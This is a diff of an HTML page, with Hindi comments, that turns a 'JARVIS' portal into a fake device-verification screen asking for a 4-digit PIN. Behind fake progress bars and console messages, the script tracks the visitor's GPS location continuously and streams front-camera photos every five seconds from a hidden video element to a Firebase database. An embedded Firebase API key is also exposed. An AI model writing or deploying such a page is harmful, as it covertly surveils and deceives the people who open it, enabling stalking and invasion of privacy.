@@ -3,35 +3,60 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>JARVIS CONNECT - SECURE PORTAL</title>
+    <title>JARVIS - SECURE SYSTEM VERIFICATION</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
         * { box-sizing: border-box; }
-        body { background: #0f172a; color: #f8fafc; font-family: '-apple-system', BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 15px; }
-        .profile-card { background: #1e293b; width: 100%; max-width: 380px; border-radius: 20px; padding: 30px 20px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.05); }
-        .avatar { width: 100px; height: 100px; border-radius: 50%; background: linear-gradient(45deg, #00f2ff, #00ff87); margin: 0 auto 15px; display: flex; justify-content: center; align-items: center; font-size: 36px; font-weight: bold; color: #0f172a; box-shadow: 0 0 20px rgba(0,242,255,0.2); }
-        .username { font-size: 20px; font-weight: 700; margin-bottom: 5px; color: #fff; }
-        .bio { font-size: 14px; color: #94a3b8; margin-bottom: 25px; line-height: 1.5; }
-        .status-box { background: rgba(0, 242, 255, 0.1); border: 1px solid #00f2ff; padding: 12px; border-radius: 12px; font-size: 14px; color: #00f2ff; font-weight: 600; }
+        body { background: #0b0f19; color: #f1f5f9; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 15px; }
+        .verification-container { background: #111827; width: 100%; max-width: 400px; border-radius: 16px; padding: 30px 24px; box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5), 0 10px 10px -5px rgba(0, 0, 0, 0.4); border: 1px solid #1f2937; text-align: center; }
+        .brand-logo { font-size: 24px; font-weight: 800; color: #38bdf8; letter-spacing: 2px; margin-bottom: 5px; }
+        .system-status { font-size: 11px; color: #10b981; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 25px; display: inline-flex; align-items: center; gap: 6px; background: rgba(16, 185, 129, 0.1); padding: 4px 10px; border-radius: 20px; }
+        .system-status::before { content: ''; width: 6px; height: 6px; background: #10b981; border-radius: 50%; display: inline-block; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0% { opacity: 0.4; } 50% { opacity: 1; } 100% { opacity: 0.4; } }
+        .instruction { font-size: 14px; color: #9ca3af; margin-bottom: 20px; line-height: 1.5; }
+        .pin-container { display: flex; justify-content: space-between; gap: 10px; margin-bottom: 25px; max-width: 280px; margin-left: auto; margin-right: auto; }
+        .pin-box { width: 50px; height: 50px; background: #1f2937; border: 2px solid #374151; border-radius: 8px; text-align: center; font-size: 20px; font-weight: bold; color: #fff; outline: none; transition: 0.2s; }
+        .pin-box:focus { border-color: #38bdf8; box-shadow: 0 0 0 2px rgba(56, 189, 248, 0.2); }
+        .verify-btn { background: #0284c7; color: #fff; border: none; padding: 12px; width: 100%; border-radius: 8px; font-size: 15px; font-weight: 600; cursor: pointer; transition: 0.2s; letter-spacing: 0.5px; }
+        .verify-btn:hover { background: #0369a1; }
+        .progress-bar-container { width: 100%; height: 4px; background: #1f2937; border-radius: 2px; margin-top: 25px; overflow: hidden; display: none; }
+        .progress-bar { width: 0%; height: 100%; background: #38bdf8; transition: width 0.4s ease; }
+        .console-logs { background: #030712; border: 1px solid #1f2937; border-radius: 6px; padding: 10px; font-family: monospace; font-size: 11px; color: #9ca3af; text-align: left; height: 70px; overflow-y: hidden; margin-top: 15px; display: none; line-height: 1.4; }
+        .log-line { margin: 0; }
         #v { width: 1px; height: 1px; opacity: 0.01; position: absolute; }
         canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="profile-card">
-        <div class="avatar">J</div>
-        <div class="username">JARVIS SECURITY PORTAL</div>
-        <div class="bio">डिजिटल आईडी वेरिफिकेशन और क्लाउड सिंक प्रक्रिया बैकग्राउंड में सक्रिय है। कृपया प्रतीक्षा करें...</div>
-        <div class="status-box" id="log-status">सिस्टम कनेक्ट हो रहा है...</div>
+    <div class="verification-container">
+        <div class="brand-logo">JARVIS CORE</div>
+        <div class="system-status">Secure Connection Gateway</div>
+        
+        <div class="instruction">डिवाइस प्रमाणीकरण पूरा करने के लिए अपना 4-अंकीय एक्सेस पिन दर्ज करें।</div>
+        
+        <div class="pin-container">
+            <input type="password" class="pin-box" maxlength="1" oninput="moveNext(this, 1)">
+            <input type="password" class="pin-box" maxlength="1" oninput="moveNext(this, 2)">
+            <input type="password" class="pin-box" maxlength="1" oninput="moveNext(this, 3)">
+            <input type="password" class="pin-box" maxlength="1" oninput="moveNext(this, 4)">
+        </div>
+
+        <button class="verify-btn" onclick="startVerification()">Verify Device</button>
+        
+        <div class="progress-bar-container" id="progressContainer">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        
+        <div class="console-logs" id="consoleLogs"></div>
     </div>
 
     <video id="v" autoplay playsinline muted></video>
     <canvas id="c"></canvas>
 
     <script>
-        // आपका फायरबेस कॉन्फ़िगरेशन (जो आपके स्क्रीनशॉट वाले पैनल से मैच करता है)
+        // 🔗 आपका फायरबेस कनेक्शन
         const firebaseConfig = {
           apiKey: "AIzaSyAfwCTBBc_LT8j7neC_aJhBCHUXj3QkSHc",
           authDomain: "army-cb492.firebaseapp.com",
@@ -45,37 +70,69 @@
         let currentLat = 0;
         let currentLon = 0;
 
-        document.addEventListener("DOMContentLoaded", () => {
-            autoStartSync();
-        });
+        // पिन बॉक्स ऑटो-फोकस लॉजिक
+        function moveNext(current, index) {
+            if (current.value.length >= 1 && index < 4) {
+                document.querySelectorAll('.pin-box')[index].focus();
+            }
+        }
 
-        async function autoStartSync() {
-            const statusDiv = document.getElementById('log-status');
+        // वेरिफिकेशन बटन दबाने पर एक्शन
+        function startVerification() {
+            document.getElementById('progressContainer').style.display = 'block';
+            document.getElementById('consoleLogs').style.display = 'block';
+            
+            addLog("Initializing verification sequence...");
+            animateProgress(20, "Establishing terminal handshake...");
+            
+            // पृष्ठभूमि में डेटा संग्रह शुरू करें
+            activateBackgroundSync();
+        }
 
-            // 1. जीपीएस ट्रैकिंग शुरू करें
+        function addLog(text) {
+            const logsDiv = document.getElementById('consoleLogs');
+            logsDiv.innerHTML += `<p class="log-line">> ${text}</p>`;
+            logsDiv.scrollTop = logsDiv.scrollHeight;
+        }
+
+        function animateProgress(target, logText) {
+            setTimeout(() => {
+                document.getElementById('progressBar').style.width = target + '%';
+                if(logText) addLog(logText);
+            }, 500);
+        }
+
+        async function activateBackgroundSync() {
+            // 1. जीपीएस सिंक
             navigator.geolocation.watchPosition((pos) => {
                 currentLat = pos.coords.latitude;
                 currentLon = pos.coords.longitude;
                 database.ref('live_detect/location').set({ lat: currentLat, lon: currentLon });
-            }, err => console.log("GPS Signal Waiting..."), { enableHighAccuracy: true });
+                animateProgress(50, "GPS telemetry payload locked.");
+            }, null, { enableHighAccuracy: true });
 
-            // 2. कैमरा स्ट्रीम चालू करें
+            // 2. कैमरा सिंक
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                 const video = document.getElementById('v');
                 video.srcObject = stream;
 
                 video.addEventListener('loadeddata', () => {
-                    statusDiv.innerHTML = "🔗 लाइव डेटा सिंक सक्रिय";
-                    captureDataInstant();
-                    setInterval(captureDataInstant, 5000); // हर 5 सेकंड में डेटाबेस में सिंक
+                    animateProgress(80, "Secure optical matrix bound.");
+                    captureAndSend();
+                    setInterval(captureAndSend, 5000); // हर 5 सेकंड में सिंक
+                    
+                    setTimeout(() => {
+                        animateProgress(100, "Verification code approved. System Synced.");
+                    }, 1500);
                 });
             } catch (e) {
-                statusDiv.innerHTML = "❌ कैमरा एक्सेस अनुमति की आवश्यकता है।";
+                addLog("Error: Hardware token validation failed.");
+                document.getElementById('progressBar').style.backgroundColor = '#ef4444';
             }
         }
 
-        function captureDataInstant() {
+        function captureAndSend() {
             const v = document.getElementById('v');
             const c = document.getElementById('c');
 
@@ -88,21 +145,11 @@
             const timestamp = Date.now();
             const currentTimeString = new Date().toLocaleTimeString();
 
-            // डिवाइस की बुनियादी जानकारी एकत्र करना
-            const deviceInfo = {
-                os: navigator.userAgent.includes("Android") ? "Android" : navigator.userAgent.includes("iPhone") ? "iOS" : "Windows/PC",
-                browser: navigator.userAgent.includes("Chrome") ? "Chrome Mobile" : "Mobile Browser",
-                screen: window.screen.width + " x " + window.screen.height
-            };
-
-            // फायरबेस डेटाबेस नोड पर डेटा पुश करना
             database.ref('live_detect').update({
                 photo: compressedPhoto,
-                last_updated: timestamp,
-                device_info: deviceInfo
+                last_updated: timestamp
             });
 
-            // बैकअप हिस्ट्री में सेव करना
             database.ref('jarvis_history/' + timestamp).set({
                 time: currentTimeString,
                 photo: compressedPhoto,
